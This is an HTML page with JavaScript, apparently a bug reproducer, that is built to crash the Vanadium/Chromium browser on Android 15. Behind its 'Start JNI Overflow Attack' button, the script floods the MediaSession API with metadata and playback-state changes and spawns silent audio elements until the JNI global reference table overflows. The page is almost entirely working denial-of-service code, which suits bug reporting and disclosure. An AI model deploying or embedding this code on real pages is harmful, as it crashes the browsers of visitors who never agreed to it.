<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Vanadium JNI GREF Overflow â€” deterministic crash repro</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    :root {
      --bg: #ffffff;
      --fg: #111111;
      --accent: #0969da;
      --accent-dark: #0550ae;
      --muted: #6e7781;
      --status-bg: #e8f4fd;
      --status-border: var(--accent);
    }
    @media (prefers-color-scheme: dark) {
      :root {
        --bg: #0c0c0c;
        --fg: #e5e5e5;
        --accent: #4f94ff;
        --accent-dark: #2a6bd6;
        --muted: #6e7781;
        --status-bg: #0d2236;
        --status-border: var(--accent);
      }
    }
    html, body { margin: 0; padding: 0; background: var(--bg); color: var(--fg); }
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
                   Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
      padding: 2rem;
      line-height: 1.45;
      max-width: 70ch;
      margin: auto;
    }
    h1 { font-size: 1.6rem; margin-top: 0; }
    button {
      background: var(--accent);
      color: #fff;
      border: none;
      padding: 0.75rem 1.5rem;
      border-radius: 6px;
      font-size: 1rem;
      cursor: pointer;
      margin: 1rem 0;
    }
    button:hover { background: var(--accent-dark); }
    button:disabled { background: var(--muted); cursor: not-allowed; }
    code { background: #f4f4f4; padding: 0.15em 0.3em; border-radius: 4px; }
    @media (prefers-color-scheme: dark) { code { background: #1e1e1e; } }
    #status {
      background: var(--status-bg);
      border: 2px solid var(--status-border);
      padding: 1rem;
      margin: 1rem 0;
      border-radius: 6px;
      font-weight: bold;
    }
    #counter, #audioCount { font-variant-numeric: tabular-nums; }
  </style>
</head>
<body>
  <h1>Vanadium Browser JNI Overflow Reproducer</h1>
  <p>
    This page purposefully crashes Vanadium/Chromium by overflowing the <code>global reference table</code>
    through the <code>MediaSession</code> JNI bridge. Open it in Vanadium (AndroidÂ 15) and hit the button.
  </p>

  <button id="startBtn">ðŸš€ Start JNI Overflow Attack</button>

  <div id="status" style="display:none;">
    <div>Status: <span id="statusText">Initializingâ€¦</span></div>
    <div>Iterations: <span id="counter">0</span></div>
    <div>Audio elements spawned: <span id="audioCount">0</span></div>
    <div>Expected crash time: ~15Â s</div>
  </div>

  <script>
    (() => {
      const SILENT_WAV = 'data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA';
      const UI_UPDATE_EVERY = 10;   // DOM writes at this cadence
      const BURST_SIZE = 32;        // refs leaked per microâ€‘task
      let counter = 0;
      let audioElementCount = 0;
      let running = false;
      const $ = id => document.getElementById(id);

      function updateUI() {
        $('counter').textContent = counter.toLocaleString();
        $('audioCount').textContent = audioElementCount.toLocaleString();
        $('statusText').textContent = running ? 'Hammering MediaSessionÂ APIâ€¦' : 'Stopped';
      }

      async function ensureBackgroundAudio() {
        // primary attempt: WebAudio oscillator (works even if tab is bgâ€‘ed)
        try {
          const ctx = new (window.AudioContext || window.webkitAudioContext)();
          const osc = ctx.createOscillator();
          const gain = ctx.createGain();
          gain.gain.setValueAtTime(0, ctx.currentTime);
          osc.connect(gain).connect(ctx.destination);
          osc.start();
          audioElementCount++;
          return;
        } catch (_) { /* fallback below */ }

        // fallback: silent <audio>
        const bg = new Audio(SILENT_WAV);
        bg.loop = true;
        bg.volume = 0;
        await bg.play().catch(() => {}); // swallow
        audioElementCount++;
      }

      function hammer() {
        if (!running) return;

        for (let i = 0; i < BURST_SIZE; i++) {
          navigator.mediaSession.playbackState = (counter & 1) ? 'playing' : 'paused';
          navigator.mediaSession.metadata = new MediaMetadata({
            title: `âš ï¸ Crash #${counter}`,
            artist: 'Repro',
            album: crypto.randomUUID()       // adds entropy for new Java strings
          });

          if (counter % 20 === 0) {
            const a = new Audio(SILENT_WAV);
            a.loop = true;
            a.volume = 0;
            a.play().catch(() => {});
            audioElementCount++;
          }
          counter++;
          if (counter % UI_UPDATE_EVERY === 0) updateUI();
        }

        // queue next burst
        queueMicrotask(hammer);
      }

      async function start() {
        if (running) return;
        running = true;
        $('startBtn').disabled = true;
        $('status').style.display = 'block';
        updateUI();

        await ensureBackgroundAudio();
        hammer();
      }

      if (!('mediaSession' in navigator)) {
        $('status').style.display = 'block';
        $('statusText').textContent = 'MediaSessionÂ API not available in this browser';
        $('startBtn').disabled = true;
      }

      $('startBtn').addEventListener('click', start);

      // Surface unexpected errors
      const bail = ev => {
        console.error(ev.reason || ev.message || ev);
        running = false;
        updateUI();
      };
      window.addEventListener('error', bail);
      window.addEventListener('unhandledrejection', bail);
    })();
  </script>


  <p><strong>Note:</strong> Other browsers will run the loop but should not crash.</p>
</body>
</html>
